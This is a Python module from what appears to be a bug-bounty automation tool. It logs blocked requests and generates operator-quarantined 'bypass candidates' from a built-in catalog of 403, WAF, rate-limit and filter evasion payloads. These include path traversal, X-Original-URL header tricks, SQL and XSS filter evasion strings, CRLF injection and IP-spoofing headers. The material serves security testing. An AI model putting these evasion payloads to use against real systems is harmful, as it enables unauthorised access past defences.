#!/usr/bin/env python3
"""BugWolf Failure Learning — blocker -> bypass-candidate feedback loop.

When a thread blocks (403 / WAF / rate-limit / filter), this records the
blocker plus what worked, and feeds the ``bypass`` research checkpoint with
fresh, provenance-tracked bypass candidates.  Candidates are **auto-
quarantined** through ``AdaptiveMemory`` and require operator review before
reuse — the existing review gate is preserved, never bypassed.

Deterministic candidate catalog per blocker/defense:

  * **403 / path filter** — path obfuscation (double-encoding, trailing
    ``;/``, ``..;/``), header-based access (``X-Original-URL``,
    ``X-Rewrite-URL``), method override (``X-HTTP-Method-Override``).
  * **WAF** — encoding variants (URL double-encode, unicode, overlong
    UTF-8), case manipulation, comment injection, whitespace/CRLF variants,
    chunked transfer, HTTP/2 pseudo-header tricks.
  * **rate limit** — IP-rotation headers (``X-Forwarded-For`` etc.),
    parameter pollution, multi-attempt-per-request splitting.
  * **generic filter** — charset, null-byte, case/unicode confusion.

``what_worked`` payloads from prior attempts are ingested with full
provenance and also quarantined (operator review still required).

Output lands at ``research/<target>/learning/failure-bypass-candidates.json``
(a ``research`` artifact).  Exposes ``make_blocked_listener`` so the campaign
can subscribe to ``WAF_BLOCKED`` and learn in reaction to live blockers.

Offline and deterministic; uncensored; no probes are sent by this tool.

Usage:
  python3 tools/intelligence/failure_learning.py --target acme --failures blockers.json
  python3 tools/intelligence/failure_learning.py --target acme --failures blockers.json --json
"""

from __future__ import annotations

import argparse
import hashlib
import json
import logging
import re
import sys
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional


def _repo_root() -> Path:
    """Walk up from this module until the tools/ package root is found."""
    current = Path(__file__).resolve().parent
    while current != current.parent:
        if (current / "tools" / "runtime_paths.py").is_file():
            return current
        current = current.parent
    return current


_CODE_ROOT = _repo_root()
if str(_CODE_ROOT) not in sys.path:
    sys.path.insert(0, str(_CODE_ROOT))
from tools.runtime_paths import target_slug, workspace_root

try:
    from tools.core.signal_bus import SignalBus, publish_or_warn
except ImportError:  # direct script execution
    from tools.core.signal_bus import SignalBus, publish_or_warn
try:
    from tools.adaptive_learning import AdaptiveMemory
except ImportError:  # pragma: no cover
    AdaptiveMemory = None

SCHEMA = "bugwolf/failure-learning/v1"
LOG = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Deterministic bypass-candidate catalog per blocker/defense marker.
# Each entry: (marker, candidate payload/technique, technique label)
# ---------------------------------------------------------------------------

BYPASS_CATALOG: List[Dict[str, Any]] = [
    # -- 403 / path filter ---------------------------------------------------
    {"marker": "403", "payload": "/%2e%2e/admin", "technique": "double-encoded dot-dot"},
    {"marker": "403", "payload": "/admin/..;/", "technique": "semicolon path traversal"},
    {"marker": "403", "payload": "/admin%00/", "technique": "null-byte path"},
    {"marker": "403", "payload": "X-Original-URL: /admin", "technique": "header-based path access"},
    {"marker": "403", "payload": "X-Rewrite-URL: /admin", "technique": "header-based path rewrite"},
    {"marker": "403", "payload": "X-HTTP-Method-Override: GET", "technique": "method override"},
    {"marker": "403", "payload": "/Admin/", "technique": "case variation"},
    # -- WAF ----------------------------------------------------------------
    {"marker": "waf", "payload": "%255c%255c", "technique": "overlong UTF-8 double-encode"},
    {"marker": "waf", "payload": "\u00e0%252f", "technique": "unicode overlong encoding"},
    {"marker": "waf", "payload": "<scr<script>ipt>", "technique": "nested tag evasion"},
    {"marker": "waf", "payload": "a/*x*/nd 1=1", "technique": "comment injection"},
    {"marker": "waf", "payload": "1\u0009OR\u00091=1", "technique": "tab whitespace evasion"},
    {"marker": "waf", "payload": "chunked\r\n0\r\n\r\n", "technique": "chunked transfer framing"},
    {"marker": "waf", "payload": ":authority override", "technique": "HTTP/2 pseudo-header order"},
    {"marker": "waf", "payload": "%u0027", "technique": "unicode escape quoting"},
    # -- rate limit ---------------------------------------------------------
    {"marker": "rate", "payload": "X-Forwarded-For: 1.2.3.4", "technique": "IP rotation header"},
    {"marker": "rate", "payload": "X-Real-IP: 5.6.7.8", "technique": "real-IP rotation header"},
    {"marker": "rate", "payload": "X-Client-IP: 9.9.9.9", "technique": "client-IP rotation header"},
    {"marker": "rate", "payload": "a=1&a=2&a=3", "technique": "parameter pollution"},
    {"marker": "rate", "payload": "multi-auth-per-request", "technique": "request splitting"},
    # -- generic filter -----------------------------------------------------
    {"marker": "filter", "payload": "%00", "technique": "null-byte truncation"},
    {"marker": "filter", "payload": "\u212a", "technique": "unicode case-confusion char"},
    {"marker": "filter", "payload": "\r\n", "technique": "CRLF injection"},
]


def _id(prefix: str, *parts: str) -> str:
    raw = "|".join(str(p).strip().lower() for p in parts)
    return prefix + "-" + hashlib.sha256(raw.encode()).hexdigest()[:12]


def _blocker_markers(blocker: str) -> List[str]:
    low = (blocker or "").lower()
    markers = []
    if "403" in low or "forbidden" in low:
        markers.append("403")
    if "waf" in low or "cloudflare" in low or "akamai" in low \
            or "mod_security" in low or "blocked" in low:
        markers.append("waf")
    if "rate" in low or "429" in low or "too many" in low:
        markers.append("rate")
    markers.append("filter")
    return markers


def _what_worked_payloads(failure: Dict[str, Any]) -> List[Dict[str, str]]:
    """Extract successful attempts with provenance (deterministic)."""
    out: List[Dict[str, str]] = []
    attempts = failure.get("attempts")
    if isinstance(attempts, list):
        for attempt in attempts:
            if not isinstance(attempt, dict):
                continue
            result = str(attempt.get("result") or "").lower()
            worked = any(k in result for k in ("200", "success", "worked",
                                               "bypass", "accepted"))
            payload = str(attempt.get("payload") or "")
            if worked and payload:
                out.append({"payload": payload,
                            "technique": str(attempt.get("technique")
                                             or "observed working payload"),
                            "provenance": "attempt-result"})
    what = str(failure.get("what_worked") or "")
    if what:
        out.append({"payload": what, "technique": "operator-reported",
                    "provenance": "operator"})
    return out


@dataclass
class BypassCandidate:
    candidate_id: str
    blocker: str
    defense: str
    bug_class: str
    payload: str
    technique: str
    provenance: str
    status: str = "quarantined"     # operator review required before reuse
    approved_by: str = ""           # operator identity once approved
    approved_at: str = ""           # approval timestamp

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class LearningReport:
    target: str
    generated_at: str
    candidates: List[BypassCandidate] = field(default_factory=list)
    memory_records: List[Dict[str, Any]] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "schema": SCHEMA,
            "target": self.target,
            "generated_at": self.generated_at,
            "candidate_count": len(self.candidates),
            "candidates": [c.to_dict() for c in self.candidates],
            "memory_records": self.memory_records,
        }


def learn(target: str, failures: List[Dict[str, Any]], *,
          project_root: Optional[str] = None,
          base_dir: Optional[str] = None,
          memory_root: Optional[str] = None) -> LearningReport:
    """Record blockers and generate quarantined bypass candidates."""
    report = LearningReport(
        target=target,
        generated_at=datetime.now(timezone.utc).isoformat(),
    )
    memory = None
    if AdaptiveMemory is not None:
        try:
            memory = AdaptiveMemory(target, root=memory_root or base_dir
                                    or (Path(project_root) if project_root
                                        else None))
        except Exception as exc:
            LOG.warning("failure_learning.adaptive_memory_init_failed: %s", exc)
            memory = None

    for failure in failures:
        if not isinstance(failure, dict):
            continue
        blocker = str(failure.get("blocker") or "unknown")
        defense = str(failure.get("defense") or blocker)
        bug_class = str(failure.get("bug_class") or "web")
        markers = _blocker_markers(blocker)

        # Catalog candidates matching the blocker markers.
        produced: List[Dict[str, str]] = []
        for entry in BYPASS_CATALOG:
            if entry["marker"] not in markers:
                continue
            produced.append({"payload": entry["payload"],
                             "technique": entry["technique"],
                             "provenance": "catalog"})
        # Working payloads from attempts (provenance tracked, still quarantined).
        produced.extend(_what_worked_payloads(failure))

        for cand in produced:
            candidate = BypassCandidate(
                candidate_id=_id("bc", blocker, bug_class, cand["payload"]),
                blocker=blocker,
                defense=defense,
                bug_class=bug_class,
                payload=cand["payload"],
                technique=cand["technique"],
                provenance=cand["provenance"],
            )
            report.candidates.append(candidate)
            if memory is not None:
                try:
                    record = memory.ingest(
                        kind="bypass_candidate",
                        title=f"{defense} bypass: {cand['technique']}",
                        summary=f"blocker: {blocker} | bug class: {bug_class}",
                        bug_classes=[bug_class],
                        defenses=[defense],
                        evidence_refs=[cand["payload"]],
                        terms=[cand["technique"]],
                        journey="blocker-feedback",
                    )
                    report.memory_records.append(record)
                except Exception as exc:
                    LOG.debug("failure_learning.memory_record_skip: %s", exc)
                    continue
    return report


def write_report(report: LearningReport, *, project_root: Optional[str] = None,
                 base_dir: Optional[str] = None) -> Path:
    """Persist to research/<target>/learning/failure-bypass-candidates.json."""
    if base_dir:
        root = Path(base_dir)
    else:
        root = workspace_root(project_root)
    target_dir = target_slug(report.target)
    out_dir = root / "research" / target_dir / "learning"
    out_dir.mkdir(parents=True, exist_ok=True)
    out = out_dir / "failure-bypass-candidates.json"
    out.write_text(json.dumps(report.to_dict(), indent=2, sort_keys=True))
    return out


def _load_report(target: str, *, project_root: Optional[str] = None,
                 base_dir: Optional[str] = None) -> Optional[Dict[str, Any]]:
    """Load the persisted learning report (failure-bypass-candidates.json)."""
    if base_dir:
        root = Path(base_dir)
    else:
        root = workspace_root(project_root)
    target_dir = target_slug(target)
    out = root / "research" / target_dir / "learning" \
        / "failure-bypass-candidates.json"
    if not out.is_file():
        return None
    try:
        data = json.loads(out.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, OSError):
        return None
    if not isinstance(data, dict):
        return None
    data.setdefault("candidates", [])
    data["_path"] = str(out)
    return data


def approve_candidate(target: str, candidate_id: str, *,
                      operator: str = "operator",
                      project_root: Optional[str] = None,
                      base_dir: Optional[str] = None) -> BypassCandidate:
    """Operator approval: mark a quarantined bypass candidate approved.

    The deterministic learning step quarantines every generated candidate
    (``status="quarantined"``) — operator review is required before any
    candidate may be replayed against the target.  This is that gate: it
    loads ``research/<target>/learning/failure-bypass-candidates.json``,
    stamps the candidate ``approved`` with the operator + timestamp, and
    persists the report back.  Returns the updated ``BypassCandidate``
    (status ``approved``).  Raises ``ValueError`` when the candidate is not
    in the quarantine ledger; re-approving an already-approved candidate is
    idempotent (returns it unchanged).
    """
    data = _load_report(target, project_root=project_root, base_dir=base_dir)
    if data is None:
        raise ValueError(
            f"no bypass-candidate ledger for target '{target}' — run the "
            "fuzz/blocked loop first")
    found = None
    for candidate in data["candidates"]:
        if str(candidate.get("candidate_id") or "") == str(candidate_id):
            found = candidate
            break
    if found is None:
        raise ValueError(f"candidate '{candidate_id}' not in the quarantine "
                         f"ledger for '{target}'")
    if not found.get("status") == "approved":
        found["status"] = "approved"
        found["approved_by"] = str(operator)
        found["approved_at"] = datetime.now(timezone.utc).isoformat()
    path = Path(data["_path"])
    path.write_text(json.dumps(
        {k: v for k, v in data.items() if k != "_path"},
        indent=2, sort_keys=True))
    return BypassCandidate(
        candidate_id=str(found.get("candidate_id") or ""),
        blocker=str(found.get("blocker") or ""),
        defense=str(found.get("defense") or ""),
        bug_class=str(found.get("bug_class") or "web"),
        payload=str(found.get("payload") or ""),
        technique=str(found.get("technique") or ""),
        provenance=str(found.get("provenance") or ""),
        status=str(found.get("status") or "approved"),
        approved_by=str(found.get("approved_by") or ""),
        approved_at=str(found.get("approved_at") or ""),
    )


def make_blocked_listener(target: str, project_root: Optional[str] = None,
                          base_dir: Optional[str] = None) -> Callable[[Any], None]:
    """Return a WAF_BLOCKED listener that records the blocker and learns.

    Advisory: listener failures are captured on the event and never raise
    (the bus treats listeners as non-gating).
    """
    def _on_blocked(event: Any) -> None:
        try:
            payload = getattr(event, "payload", {}) or {}
            blocker = str(payload.get("blocker") or payload.get("reason")
                          or "WAF_BLOCKED")
            failure = {
                "blocker": blocker,
                "defense": str(payload.get("defense") or blocker),
                "bug_class": str(payload.get("bug_class") or "web"),
            }
            learn(target, [failure], project_root=project_root,
                  base_dir=base_dir)
        except Exception:
            raise  # captured by the bus, advisory only
    return _on_blocked


def main() -> int:
    parser = argparse.ArgumentParser(description="Failure learning (blocker feedback)")
    parser.add_argument("--target", required=True, help="target slug")
    parser.add_argument("--failures", required=True,
                        help="path to failures JSON (list or {failures: [...]})")
    parser.add_argument("--json", action="store_true", help="emit JSON to stdout")
    parser.add_argument("--project-root", default=None, help="workspace root override")
    parser.add_argument("--base-dir", default=None, help="output base dir override")
    args = parser.parse_args()

    try:
        raw = json.loads(Path(args.failures).read_text())
    except (OSError, json.JSONDecodeError) as exc:
        print(json.dumps({"error": f"cannot read failures: {exc}"}))
        LOG.error("failure_learning.read_failures_failed: %s", exc)
        return 2
    failures = raw.get("failures") if isinstance(raw, dict) else raw
    if not isinstance(failures, list):
        failures = [raw]

    report = learn(args.target, failures, project_root=args.project_root,
                   base_dir=args.base_dir)
    out = write_report(report, project_root=args.project_root,
                       base_dir=args.base_dir)

    if report.candidates:
        publish_or_warn(args.target, "RESEARCH_REFRESHED",
                        source="failure_learning",
                        payload={"candidate_count": len(report.candidates),
                                 "target": args.target},
                        project_root=args.project_root, base_dir=args.base_dir)

    if args.json:
        print(json.dumps(report.to_dict(), indent=2, sort_keys=True))
        LOG.info("failure_learning.report target=%s candidates=%d",
                 args.target, len(report.candidates))
    else:
        print(f"[+] {args.target}: {len(report.candidates)} bypass candidates "
              f"quarantined -> {out}")
        LOG.info("failure_learning.summary target=%s candidates=%d out=%s",
                 args.target, len(report.candidates), out)
    return 0


if __name__ == "__main__":
    sys.exit(main())
